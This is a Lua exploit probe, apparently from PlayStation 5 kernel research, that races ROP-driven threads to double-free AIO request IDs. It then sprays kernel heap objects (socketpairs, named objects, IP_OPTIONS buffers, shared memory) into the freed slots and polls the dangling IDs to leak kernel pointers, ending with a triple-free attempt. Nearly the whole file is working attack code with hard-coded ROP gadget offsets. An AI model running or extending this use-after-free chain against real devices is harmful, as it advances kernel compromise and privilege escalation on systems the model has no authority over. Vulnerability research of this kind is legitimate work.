-- CRASH_CLASS: HIGH
-- PROBE 65m: aio double-free → UAF read attempt
--
-- After double-freeing AIO IDs (proven in 65l), try to read the
-- freed kernel objects via:
-- 1. 664 (poll) on the double-freed IDs — does it dereference a
--    dangling pointer and return stale/replaced data?
-- 2. Spray controlled data into the freed slots (pipe buffers,
--    setsockopt, shm, namedobj) then poll again.
-- 3. Check for kernel pointers in the returned state values.
--
-- The 669 request stride is 0x28 (40 bytes) in userland.
-- The kernel-side AIO request node size is unknown; we measure
-- empirically by spraying different-sized objects.

print("=== PROBE 65m: aio UAF read ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS/SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- AIO helpers
local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- Shared buffers for children
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

local function build_delete_child(states_buf)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(N(del_ids)))
    emit(g_pop_rsi); emit(uint64(BATCH))
    emit(g_pop_rdx); emit(uint64(N(states_buf)))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)

    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

-- [A] Trigger double-free: submit, poll, race two children
print("")
print("[A] Triggering double-free (same as 65l)")
local ids = {}
for i = 1, BATCH do
    local id = submit_one()
    if id ~= 0 then
        poll_one(id)
        table.insert(ids, id)
    end
end
print(string.format("  submitted %d IDs", #ids))

local count = #ids
for i = 0, count - 1 do
    wd(N(del_ids) + i * 4, ids[i + 1])
    wd(N(states_A) + i * 4, 0xAAAAAAAA)
    wd(N(states_B) + i * 4, 0xBBBBBBBB)
end

local par_A = build_delete_child(states_A)
local par_B = build_delete_child(states_B)

pcall(function() mk(455)(par_A, uint64(0x38)) end)
pcall(function() mk(455)(par_B, uint64(0x38)) end)

for w = 1, 50000 do local _ = rd(N(del_ids)) end

local double_ids = {}
for i = 0, count - 1 do
    local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
    local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
    if sA == 0 and sB == 0 then
        table.insert(double_ids, ids[i + 1])
    end
end
print(string.format("  DOUBLE-FREED: %d IDs", #double_ids))
if #double_ids == 0 then
    print("  No double-frees this run. Abort.")
    print("=== 65m COMPLETE (no race hit) ===")
    return
end

for i, id in ipairs(double_ids) do
    print(string.format("    [%d] id=0x%X", i, id))
end

if not alive() then print("DEAD after race"); return end

-- [B] Try polling the double-freed IDs BEFORE spray
print("")
print("[B] Poll double-freed IDs (pre-spray)")
local pre_poll = memory.alloc(4 * #double_ids + 0x10)
local pre_st = memory.alloc(4 * #double_ids + 0x10)
for i = 0, #double_ids - 1 do
    wd(N(pre_poll) + i * 4, double_ids[i + 1])
    wd(N(pre_st) + i * 4, 0xDEADDEAD)
end
pcall(function()
    mk(664)(uint64(N(pre_poll)), uint64(#double_ids), uint64(N(pre_st)))
end)
for i = 0, #double_ids - 1 do
    local st = rd(N(pre_st) + i * 4) or 0xDEADDEAD
    local h, l = 0, st
    print(string.format("  id=0x%X poll_state=0x%08X %s",
        double_ids[i + 1], st,
        (st ~= 0 and st ~= 0xDEADDEAD and st ~= 0x80020003) and "*** INTERESTING ***" or ""))
end

if not alive() then print("DEAD after pre-spray poll"); return end

-- [C] Spray: create many small kernel objects to reclaim freed slots
-- Strategy 1: pipe() creates kernel pipe buffer headers
-- Strategy 2: setsockopt with controlled data
-- Strategy 3: namedobj_create (557) — each call allocates a kernel object
-- Strategy 4: shm_open (482)
print("")
print("[C] Heap spray — 128 pipes")
local spray_fds = {}
for i = 1, 128 do
    local pf = memory.alloc(8)
    wd(N(pf), 0); wd(N(pf) + 4, 0)
    local ok, rv = pcall(function() return mk(42)(uint64(N(pf))) end)
    -- pipe syscall on PS5 is via make_syscall
    -- Actually: pipe2(542) or pipe returns via r/w fds
    -- Let's use socketpair instead - proven working
end

-- socketpair is more reliable - proven in prior probes
print("[C] Heap spray — 64 socketpairs")
local sp_fds = {}
local sp_buf = memory.alloc(8)
for i = 1, 64 do
    wd(N(sp_buf), 0); wd(N(sp_buf) + 4, 0)
    local ok, rv = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf)))
    end)
    if ok then
        local f1 = rd(N(sp_buf)) or 0
        local f2 = rd(N(sp_buf) + 4) or 0
        if f1 > 0 then table.insert(sp_fds, {f1, f2}) end
    end
end
print(string.format("  created %d socketpairs", #sp_fds))

-- Also spray with namedobj_create (557) — allocates kernel named objects
print("[C] Heap spray — 128 namedobjs")
local nobj_handles = {}
for i = 1, 128 do
    local name = put_str(string.format("spray_%04d", i))
    local ok, rv = pcall(function()
        return mk(557)(uint64(N(name)), uint64(i), uint64(0))
    end)
    if ok then
        local h = N(rv)
        if h > 0 then table.insert(nobj_handles, h) end
    end
end
print(string.format("  created %d namedobjs", #nobj_handles))

-- Also spray with setsockopt buffers on the socketpairs
-- SO_SNDBUF / SO_RCVBUF set kernel integers
-- SO_LINGER sets a small struct
-- IP_OPTIONS can set arbitrary bytes
print("[C] Heap spray — setsockopt on socketpairs")
local opt_buf = memory.alloc(0x100)
local marker_pattern = 0x41424344
for i = 0, 0xFC, 4 do wd(N(opt_buf) + i, marker_pattern + i) end
local sopt_count = 0
for _, pair in ipairs(sp_fds) do
    local fd = pair[1]
    -- IP_OPTIONS (level=0, optname=1) - up to 44 bytes
    pcall(function()
        mk(105)(uint64(fd), uint64(0), uint64(1), uint64(N(opt_buf)), uint64(40))
    end)
    sopt_count = sopt_count + 1
end
print(string.format("  set IP_OPTIONS on %d sockets", sopt_count))

-- Also spray with shm_open (482) — each creates a kernel vm_object
print("[C] Heap spray — 32 shm objects")
local shm_fds = {}
for i = 1, 32 do
    local name = put_str(string.format("/spray_shm_%04d", i))
    local ok, rv = pcall(function()
        return mk(482)(uint64(N(name)), uint64(0x202), uint64(0x1FF))
    end)
    if ok and sgn(rv) >= 0 then
        table.insert(shm_fds, sgn(rv))
    end
end
print(string.format("  created %d shm objects", #shm_fds))

if not alive() then print("DEAD after spray"); return end

-- [D] Poll double-freed IDs AFTER spray
print("")
print("[D] Poll double-freed IDs (post-spray)")
for i = 0, #double_ids - 1 do
    wd(N(pre_poll) + i * 4, double_ids[i + 1])
    wd(N(pre_st) + i * 4, 0xDEADDEAD)
end
pcall(function()
    mk(664)(uint64(N(pre_poll)), uint64(#double_ids), uint64(N(pre_st)))
end)
local kptrs = 0
for i = 0, #double_ids - 1 do
    local st = rd(N(pre_st) + i * 4) or 0xDEADDEAD
    local interesting = ""
    if st ~= 0 and st ~= 0xDEADDEAD and st ~= 0x80020003 and st ~= 3 and st ~= 0x10003 then
        interesting = "*** CHANGED ***"
    end
    print(string.format("  id=0x%X poll_state=0x%08X %s", double_ids[i + 1], st, interesting))
    -- Check full qword at that state slot
    local qv = rq(N(pre_st) + i * 4)
    if qv then
        local qh, ql = get_hi_lo(qv)
        if qh >= 0xFFFF8000 then
            kptrs = kptrs + 1
            print(string.format("    *** KERNEL POINTER: %s ***", fmt(qv)))
        end
    end
end

-- [E] Try 663 (wait) on double-freed IDs with zero timeout
print("")
print("[E] Wait(663) on double-freed IDs (0 timeout)")
local wait_ids = memory.alloc(4 * #double_ids + 0x10)
local wait_st = memory.alloc(4 * #double_ids + 0x10)
local timeout = memory.alloc(0x10)
wq(N(timeout), uint64(0)); wq(N(timeout) + 8, uint64(0))
for i = 0, #double_ids - 1 do
    wd(N(wait_ids) + i * 4, double_ids[i + 1])
    wd(N(wait_st) + i * 4, 0xDEADDEAD)
end
local ok, rv = pcall(function()
    return mk(663)(uint64(N(wait_ids)), uint64(#double_ids),
        uint64(N(wait_st)), uint64(0), uint64(N(timeout)))
end)
print(string.format("  wait ret=%s", ok and tostring(sgn(rv)) or "FAIL"))
for i = 0, #double_ids - 1 do
    local st = rd(N(wait_st) + i * 4) or 0xDEADDEAD
    if st ~= 0xDEADDEAD then
        print(string.format("  id=0x%X wait_state=0x%08X", double_ids[i + 1], st))
    end
end

-- [F] Try delete(662) on double-freed IDs (third delete = triple free?)
print("")
print("[F] Delete(662) on double-freed IDs (triple delete attempt)")
local del3_ids = memory.alloc(4 * #double_ids + 0x10)
local del3_st = memory.alloc(4 * #double_ids + 0x10)
for i = 0, #double_ids - 1 do
    wd(N(del3_ids) + i * 4, double_ids[i + 1])
    wd(N(del3_st) + i * 4, 0xDEADDEAD)
end
pcall(function()
    mk(662)(uint64(N(del3_ids)), uint64(#double_ids), uint64(N(del3_st)))
end)
for i = 0, #double_ids - 1 do
    local st = rd(N(del3_st) + i * 4) or 0xDEADDEAD
    local interesting = ""
    if st == 0 then interesting = "*** TRIPLE FREE ***" end
    print(string.format("  id=0x%X state=0x%08X %s", double_ids[i + 1], st, interesting))
end

if not alive() then print("DEAD after triple-delete"); return end

-- [G] Summary
print("")
print("[G] SUMMARY")
print(string.format("  double-freed IDs: %d", #double_ids))
print(string.format("  kernel pointers:  %d", kptrs))
print(string.format("  spray: %d socketpairs, %d namedobjs, %d shm",
    #sp_fds, #nobj_handles, #shm_fds))
print(string.format("  process: %s", alive() and "ALIVE" or "DEAD"))

-- Cleanup
for _, pair in ipairs(sp_fds) do
    pcall(function() mk(6)(uint64(pair[1])) end)
    pcall(function() mk(6)(uint64(pair[2])) end)
end
for _, h in ipairs(nobj_handles) do
    pcall(function() mk(558)(uint64(h)) end)
end
for _, fd in ipairs(shm_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end

print("")
print("=== 65m COMPLETE ===")
